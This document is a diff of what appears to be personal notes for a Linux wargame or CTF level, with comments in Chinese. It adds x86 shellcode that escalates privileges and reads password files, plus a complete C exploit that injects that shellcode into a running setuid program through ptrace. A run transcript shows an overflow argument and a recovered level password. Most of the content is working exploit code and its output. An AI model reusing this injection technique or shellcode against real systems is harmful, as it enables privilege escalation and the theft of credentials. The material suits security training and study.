@@ -145,6 +145,23 @@ AAAA[bfffdbed][00000040][00000000][bfffda50][41414141][3830255b][255b5d78]
 
 2. 我们自己来处理ptrace(PTRACE_TRACEME,0,0,0)
 
+
+setreuid(geteuid(),geteuid()) + readfile
+ char shellcode[] = "\x31\xc0\xb0\x31\x99\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\x
+cd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
+"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
+"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
+"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
+"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
+"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
+"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
+"\xff"
+"/home/level09/.pass";
+
+
+
+exploit.c:
+
 #include <sys/ptrace.h>
 #include <sys/fcntl.h>
 #include <sys/user.h>
@@ -156,77 +173,150 @@ AAAA[bfffdbed][00000040][00000000][bfffda50][41414141][3830255b][255b5d78]
 #include <unistd.h>
 #include <errno.h>
 
+
+const int long_size = sizeof(long);
 void traphdl(int s) {
   printf("TRAP caught.\n");
 }
+void childhdl(int s)
+{
+//   printf("SIGCHILD caught\n");
+}
+void getdata(pid_t child, long addr,
+             char *str, int len)
+{
+    char *laddr;
+    int i, j;
+    union u
+    {
+        long val;
+        char chars[long_size];
+    }data;
 
-int main(int an, char **ac, char **environ) {
-  char shellcode[] = "\xc2\x90\xc2\x90\xc2\x90\xc2\x90\xc2\x90\x31\xc3\x80\xc2\x99\xc2\xb0\x05\x68\x43\x54\x46\x00\x68\x2e\x73\x6d\x70\xc2\x89\xc3\xa3\x31\xc3\x89\xc3\x8d\xc2\x80\xc2\x89\xc3\x86\xc2\x89\xc3\x90\xc2\xb0\x03\xc2\x89\xc3\xb3\xc2\x89\xc3\xa1\xc2\xb2\x60\xc3\x8d\xc2\x80\x31\xc3\x80\xc2\xb0\x04\x31\xc3\x9b\xc3\x8d\xc2\x80";
+    i = 0;
+    j = len / long_size;
+    laddr = str;
+
+    while(i < j)
+    {
+        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
+        memcpy(laddr, data.chars, long_size);
+        ++i;
+        laddr += long_size;
+    }
+    j = len % long_size;
+    if(j != 0)
+    {
+        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
+        memcpy(laddr, data.chars, j);
+    }
+    str[len] = '\0';
+}
+
+void putdata(pid_t child, long addr, char *str, int len)
+{
+    char *laddr;
+    int i, j;
+    union u
+    {
+        long val;
+        char chars[long_size];
+    }data;
+
+    i = 0;
+    j = len / long_size;
+    laddr = str;
+    while(i < j)
+    {
+        memcpy(data.chars, laddr, long_size);
+        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
+        ++i;
+        laddr += long_size;
+    }
+    j = len % long_size;
+    if(j != 0)
+    {
+        memcpy(data.chars, laddr, j);
+        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
+    }
+}
+
+int main(int argc, char **argv, char **environ) {
   int f;
-
+  char parameter[500]={0};
+  char bak[1000] ={0};
+  char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x83\xec\x14\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
+"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
+"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
+"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
+"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
+"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
+"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
+"\xff"
+"/home/level10/.pass\x00";
+  int sc_length = sizeof(shellcode);
+  strncpy(parameter, argv[1], sizeof(parameter));
   signal(SIGTRAP, traphdl);
+  signal(SIGCHLD, childhdl);
   f = fork();
   if (f == 0) {
-    int g = open("/tmp/.hesso/flagX", O_TRUNC|O_RDWR, 0666);
-    dup2(g, 1);
-    dup2(g, 2);
-    char *X[2] = { "/usr/smp/challenge9/challenge9", NULL };
-    execve(X[0], X, environ);
+    char *X[3] = { "/levels/level9/level9", parameter, NULL };
+    //ptrace(PTRACE_TRACEME, 0, NULL, NULL);
+    int ret = execve(X[0], X, environ);
+    if(ret == -1)
+        perror("execve");
     return 255;
-  } else if (f > 0) {
-    int W = 0, S;
-    sleep(2);
-    kill(f, SIGCHLD);  /* 向子进程发送信号，从而让子进程停止执行，并向父进程发送消息，从而被跟踪 */
-    while (W == 0 || errno != ECHILD) {
-      errno = 0;
-      W = waitpid(f, &S, 0);
-      if (W == f && WIFSTOPPED(S) && WSTOPSIG(S) == SIGCHLD) {
-        struct user_regs_struct U;
-        unsigned long p, p2, pE;
-
-        memset(&U, 0, sizeof(U));
-        ptrace(PTRACE_GETREGS, f, 0, &U);
-        fprintf(stderr, "EIP/EBP/ESP: %p / %p / %p\n", U.eip, U.ebp, U.esp);
-
-        for (p = U.ebp; p; ) {
-          p2 = ptrace(PTRACE_PEEKDATA, f, p, 0);
-          pE = ptrace(PTRACE_PEEKDATA, f, p+4, 0);
-          fprintf(stderr, "EBP at %p has %p, r-eip %p\n", p, p2, pE);
-          p = p2;
-          if ((pE & 0xfff) == 0x930) {
-            break;
-          }
-        }
-
-        // RWX memory at (p)
-
-        for (p2 = 0; p2 < sizeof(shellcode); p2 += 4) {
-          ptrace(PTRACE_POKEDATA, f, p + p2, *(long *)(shellcode + p2));
-        }
-        for (p2 = 0; p2 < 40; p2 += 4) {
-          fprintf(stderr, "Stack frame at %p: %8.8x\n", p+p2, ptrace(PTRACE_PEEKDATA, f, p+p2, 0));
-        }
-
-        U.eip = p+2;
-        U.esp = U.eip + 150;
-        ptrace(PTRACE_SETREGS, f, 0, &U);
-        ptrace(PTRACE_GETREGS, f, 0, &U);
-        fprintf(stderr, "EIP before/after: %p\n", U.eip);
-
-        while (1) {
-          ptrace(PTRACE_SINGLESTEP, f, 0, 0);
-          (void)waitpid(f, &S, 0);
-          ptrace(PTRACE_GETREGS, f, 0, &U);
-          printf("Now at %p\n", U.eip);
-          usleep(100000);
-        }
-
-        ptrace(PTRACE_DETACH, f, 0, 0);
-      } else if (W == f) {
-        ptrace(PTRACE_DETACH, f, 0, 0);
-      }
-    }
   }
+  else if (f > 0)
+  {
+     int pid = 0;
+     int status;
+     printf("Father process: child process pid = %d\n", f);
+     int mark = 0;
+     while (pid == 0 || errno != ECHILD) {
+         pid = wait(&status);
+         if(WIFEXITED(status))
+         {
+             printf("child exited\n");
+             return 0;
+         }
+      if (pid == f && WIFSTOPPED(status)) {
+        struct user_regs_struct U;
+        memset(&U, 0, sizeof(U));
+        errno = 0;
+        int ret = ptrace(PTRACE_GETREGS, f, 0, &U);
+        if (ret < 0)
+        {
+           printf("errno = %d",errno);
+           perror(errno);
+           return 1;
+        }
+  //      printf("SYSCALL=%d\nEIP=%p; EBP=%p;ESP=%p;ESI=%d;EDI=%d;EAX=%d;EBX=%d;ECX=%d;EDX=%d\n",U.orig_eax, U.eip, U.ebp, U.esp, U.esi, U.edi, U.eax, U.ebx,U.ecx,U.edx);
+        if (mark == 0)
+        {
+           struct user_regs_struct tmp = U;
+           tmp.esp = tmp.ebp - 20;
 
+           printf("tmp.esp = %x,child will exit,write shellcode\n", tmp.esp);
+           getdata(f, U.eip, bak,sc_length - 1);
+           putdata(f, U.eip, shellcode, sc_length - 1);
+           ptrace(PTRACE_SETREGS, f, NULL, &tmp);
+           mark++;
+        }
+        ptrace(PTRACE_SYSCALL, f, NULL, NULL);
+    //    printf("***********************************\n");    
+     }
+       }
   return 0;
 }
+}
+
+[level9@logic code]$ ./exploit $(perl -e 'print"A"x(256)."BBBB"')
+Father process: child process pid = 3392
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+tmp.esp = bfffd9ec,child will exit,write shellcode
+odt9xO4e
+child exited
+
+
+密码： odt9xO4e
